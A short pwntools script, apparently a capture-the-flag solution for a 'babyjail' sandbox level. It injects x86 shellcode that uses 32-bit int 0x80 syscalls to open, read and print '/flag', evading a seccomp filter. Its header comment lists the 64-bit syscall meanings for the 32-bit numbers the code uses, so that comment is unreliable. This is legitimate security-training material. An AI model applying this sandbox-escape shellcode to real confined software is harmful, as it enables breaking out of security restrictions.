from pwn import *
import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# syscalls (32 bit mode)
# 3 - close
# 4 - stat
# 5 - fstat
# 6 - lstat
# with pwn.process(["sudo", "strace","/challenge/babyjail_level9"]) as target:
with pwn.process(["/challenge/babyjail_level9"]) as target:

    pwn.info(target.readrepeat(1))

    target.send(pwn.asm(f"""
    //open
    xor ecx, ecx
    lea ebx, [eip+flag]
    mov eax, 5
    nop
    int 0x80

    //read
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    //fd is saved in eax
    mov ebx, eax    
    lea ecx, [eip + root]
    mov edx, 100
    mov eax, 3
    int 0x80


    //write
    mov ebx, 1
    lea ecx, [eip+root]
    //mov ecx, esp
    mov edx, 100
    mov eax, 4
    int 0x80


flag:
    .string "/flag"

root:
    .string "/"
    """))

    pwn.info(target.readrepeat(1))


    #print to file
    #with open("target.bin", "wb") as f:
    #    f.write(target)
    #exit(1)

